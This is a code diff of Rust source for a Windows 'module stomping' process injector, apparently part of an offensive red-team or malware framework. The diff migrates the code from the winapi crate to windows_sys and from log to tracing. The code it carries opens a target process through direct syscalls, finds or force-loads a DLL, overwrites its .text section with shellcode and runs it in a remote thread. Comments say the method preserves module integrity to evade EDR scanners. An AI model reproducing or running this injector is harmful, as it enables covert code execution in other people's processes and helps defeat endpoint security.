@@ -105,13 +105,14 @@ fn build_ldr_load_dll_stub(ldr_addr: u64, us_struct_va: u64, base_out_va: u64) -
 /// least `min_text_size` bytes and the DLL must not match any exclusion.
 #[cfg(windows)]
 unsafe fn collect_peb_candidates(
-    h_proc: *mut winapi::ctypes::c_void,
+    h_proc: *mut std::ffi::c_void,
     peb_addr: usize,
     min_text_size: usize,
     exclusions: &[String],
     builtin_exclusions: &[&str],
 ) -> Result<Vec<DllCandidate>> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 
     // Read Ldr pointer from PEB
     let mut ldr_ptr = 0usize;
@@ -162,7 +163,7 @@ unsafe fn collect_peb_candidates(
                 // Read PE headers from target process to check .text section
                 let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                 let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
-                if s >= 0 && dos_header.e_magic == winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+                if s >= 0 && dos_header.e_magic == windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
                     let nt_addr = dll_base + dos_header.e_lfanew as usize;
                     let mut nt_headers: IMAGE_NT_HEADERS64 = std::mem::zeroed();
                     let (s, _) = nt_read_proc!(h_proc, nt_addr as u64, &mut nt_headers);
@@ -183,13 +184,13 @@ unsafe fn collect_peb_candidates(
                                 break;
                             }
                             if &sec.Name[..5] == b".text"
-                                && *sec.Misc.VirtualSize() as usize >= min_text_size
+                                && sec.Misc.VirtualSize as usize >= min_text_size
                             {
                                 candidates.push(DllCandidate {
                                     name: name_str.clone(),
                                     base: dll_base,
                                     text_rva: sec.VirtualAddress,
-                                    text_size: *sec.Misc.VirtualSize(),
+                                    text_size: sec.Misc.VirtualSize,
                                 });
                                 break;
                             }
@@ -240,7 +241,7 @@ macro_rules! nt_alloc_proc {
             &mut _base as *mut _ as u64,
             0u64,
             &mut _sz as *mut _ as u64,
-            (winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE) as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
             $prot as u64,
         );
         if _s.unwrap_or(-1) < 0 || _base.is_null() {
@@ -292,12 +293,12 @@ macro_rules! nt_protect_proc {
 #[cfg(windows)]
 impl Injector for ModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-        use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READWRITE};
-        use winapi::um::winnt::{
-            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-            PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE, THREAD_TERMINATE,
-        };
+        use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+        use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
+        use crate::win_types::PAGE_READWRITE;
+        const SYNCHRONIZE: u32 = 0x00100000;
+        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_TERMINATE};
 
         // Minimal thread access mask for NtCreateThreadEx:
         // SYNCHRONIZE (0x100000) – WaitForSingleObject
@@ -308,7 +309,7 @@ impl Injector for ModuleStompInjector {
 
         let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
-            log::info!(
+            tracing::info!(
                 "PE payload detected, forwarding to process hollowing's inject_into_process"
             );
             return match hollowing::windows_impl::inject_into_process(pid, payload) {
@@ -330,7 +331,7 @@ impl Injector for ModuleStompInjector {
             &[]
         };
 
-        log::debug!(
+        tracing::debug!(
             "module_stomp: {} sacrificial candidates, {} operator exclusions, {} builtin exclusions",
             sacrificial_candidates.len(),
             operator_exclusions.len(),
@@ -340,8 +341,8 @@ impl Injector for ModuleStompInjector {
         // ── Open target process via NtOpenProcess ──────────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         unsafe {
             let mut h_proc_val: usize = 0;
@@ -367,7 +368,7 @@ impl Injector for ModuleStompInjector {
                 }
                 Err(e) => return Err(anyhow!("ModuleStomp: NtOpenProcess syscall failed: {}", e)),
             }
-            let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
+            let h_proc = h_proc_val as *mut std::ffi::c_void;
 
             macro_rules! close_h {
                 () => {
@@ -393,9 +394,9 @@ impl Injector for ModuleStompInjector {
                 .ok_or_else(|| anyhow!("NtQueryInformationProcess not found"))?;
 
             type NtQueryInfoProcess = unsafe extern "system" fn(
-                winapi::shared::ntdef::HANDLE,
+                crate::win_types::HANDLE,
                 u32,
-                *mut winapi::ctypes::c_void,
+                *mut std::ffi::c_void,
                 u32,
                 *mut u32,
             ) -> i32;
@@ -432,7 +433,7 @@ impl Injector for ModuleStompInjector {
                 e
             })?;
 
-            log::debug!(
+            tracing::debug!(
                 "module_stomp: found {} candidate DLLs already loaded in target",
                 candidates.len(),
             );
@@ -452,7 +453,7 @@ impl Injector for ModuleStompInjector {
 
             // ── If no suitable DLL found, load one via LdrLoadDll ──────────
             if target_base == 0 {
-                log::info!(
+                tracing::info!(
                     "module_stomp: no pre-loaded DLL has suitable .text, attempting LdrLoadDll fallback"
                 );
                 const PREFERRED_TEXT_MIN: usize = 256 * 1024;
@@ -469,7 +470,7 @@ impl Injector for ModuleStompInjector {
 
                     let remote_buf = nt_alloc_proc!(h_proc, total_remote, PAGE_READWRITE);
                     if remote_buf.is_null() {
-                        log::warn!(
+                        tracing::warn!(
                             "module_stomp: failed to allocate remote buffer for {}",
                             candidate
                         );
@@ -479,13 +480,13 @@ impl Injector for ModuleStompInjector {
                     let (s, _) =
                         nt_write_proc!(h_proc, remote_buf, wide.as_ptr() as *const u16, wide_bytes);
                     if s < 0 {
-                        log::warn!("module_stomp: failed to write DLL name for {}", candidate);
+                        tracing::warn!("module_stomp: failed to write DLL name for {}", candidate);
                         nt_free_proc!(h_proc, remote_buf);
                         continue;
                     }
 
                     let remote_us_ptr =
-                        (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
+                        (remote_buf as usize + us_offset) as *mut std::ffi::c_void;
                     let remote_str_va = remote_buf as usize;
                     let mut us_bytes = [0u8; 16];
                     us_bytes[0..2].copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes());
@@ -493,7 +494,7 @@ impl Injector for ModuleStompInjector {
                     us_bytes[8..16].copy_from_slice(&(remote_str_va as u64).to_le_bytes());
                     let (s, _) = nt_write_proc!(h_proc, remote_us_ptr, us_bytes.as_ptr(), 16);
                     if s < 0 {
-                        log::warn!(
+                        tracing::warn!(
                             "module_stomp: failed to write UNICODE_STRING for {}",
                             candidate
                         );
@@ -503,7 +504,7 @@ impl Injector for ModuleStompInjector {
 
                     let stub_region = nt_alloc_proc!(h_proc, 256, PAGE_READWRITE);
                     if stub_region.is_null() {
-                        log::warn!(
+                        tracing::warn!(
                             "module_stomp: failed to allocate stub region for {}",
                             candidate
                         );
@@ -520,7 +521,7 @@ impl Injector for ModuleStompInjector {
 
                     let (s, _) = nt_write_proc!(h_proc, stub_region, stub.as_ptr(), stub.len());
                     if s < 0 {
-                        log::warn!(
+                        tracing::warn!(
                             "module_stomp: failed to write LdrLoadDll stub for {}",
                             candidate
                         );
@@ -532,7 +533,7 @@ impl Injector for ModuleStompInjector {
                     let prot_status =
                         nt_protect_proc!(h_proc, stub_region, stub.len(), PAGE_EXECUTE_READ);
                     if prot_status < 0 {
-                        log::warn!(
+                        tracing::warn!(
                             "module_stomp: NtProtectVirtualMemory on stub failed {:#x} for {}",
                             prot_status,
                             candidate
@@ -560,7 +561,7 @@ impl Injector for ModuleStompInjector {
                         0u64, // MaximumStackSize
                         0u64, // AttributeList
                     );
-                    let h_thread = h_thread as *mut winapi::ctypes::c_void;
+                    let h_thread = h_thread as *mut std::ffi::c_void;
 
                     match thread_status {
                         Ok(s) if s >= 0 && !h_thread.is_null() => {
@@ -577,13 +578,13 @@ impl Injector for ModuleStompInjector {
                             let wait_nt = wait_status.unwrap_or(-1i32);
                             const STATUS_TIMEOUT: i32 = 0x00000102;
                             if wait_nt == STATUS_TIMEOUT {
-                                log::warn!(
+                                tracing::warn!(
                                     "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                     LDRLOADDLL_TIMEOUT_MS, candidate
                                 );
                                 crate::syscall!("NtTerminateThread", h_thread as u64, 1u64).ok();
                             } else if wait_nt != 0 {
-                                log::warn!(
+                                tracing::warn!(
                                     "module_stomp: NtWaitForSingleObject returned {:#x} for {}",
                                     wait_nt as u32,
                                     candidate
@@ -592,13 +593,13 @@ impl Injector for ModuleStompInjector {
                             crate::syscall!("NtClose", h_thread as u64).ok();
                         }
                         Ok(s) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "module_stomp: NtCreateThreadEx for LdrLoadDll returned status {:#x} for {}",
                                 s, candidate
                             );
                         }
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "module_stomp: NtCreateThreadEx syscall failed: {} for {}",
                                 e,
                                 candidate
@@ -658,7 +659,7 @@ impl Injector for ModuleStompInjector {
                 }
             }
 
-            log::info!(
+            tracing::info!(
                 "module_stomp: selected '{}' at {:#x} (.text RVA={:#x}, size={} bytes) for {}-byte payload",
                 target_dll_name.as_deref().unwrap_or("(unknown)"),
                 target_base,
@@ -672,7 +673,7 @@ impl Injector for ModuleStompInjector {
                 // Re-read from target DLL as fallback
                 let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
                 let (s, _) = nt_read_proc!(h_proc, target_base as u64, &mut dos_header);
-                if s < 0 || dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+                if s < 0 || dos_header.e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
                     cleanup_and_err!("Invalid DOS signature on target DLL");
                 }
                 let nt_addr = target_base + dos_header.e_lfanew as usize;
@@ -697,7 +698,7 @@ impl Injector for ModuleStompInjector {
                     }
                     if &sec.Name[..5] == b".text" {
                         text_rva = sec.VirtualAddress;
-                        text_size = *sec.Misc.VirtualSize();
+                        text_size = sec.Misc.VirtualSize;
                         break;
                     }
                 }
@@ -718,7 +719,7 @@ impl Injector for ModuleStompInjector {
             // Change protection to RW, write shellcode, restore to RX.
             // Only the .text section is modified — the rest of the DLL image
             // remains untouched, preserving module integrity for EDR scanners.
-            let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;
+            let target_addr = (target_base + text_rva as usize) as *mut std::ffi::c_void;
 
             let rw_status = nt_protect_proc!(h_proc, target_addr, payload.len(), PAGE_READWRITE);
             if rw_status < 0 {
@@ -777,7 +778,7 @@ impl Injector for ModuleStompInjector {
                 0u64, // MaximumStackSize
                 0u64, // AttributeList
             );
-            let h_exec_thread = h_exec_thread as *mut winapi::ctypes::c_void;
+            let h_exec_thread = h_exec_thread as *mut std::ffi::c_void;
 
             match exec_status {
                 Ok(s) if s >= 0 && !h_exec_thread.is_null() => {
@@ -791,7 +792,7 @@ impl Injector for ModuleStompInjector {
                 }
             }
 
-            log::info!(
+            tracing::info!(
                 "module_stomp: successfully injected {}-byte payload into '{}'",
                 payload.len(),
                 target_dll_name.as_deref().unwrap_or("(unknown)"),
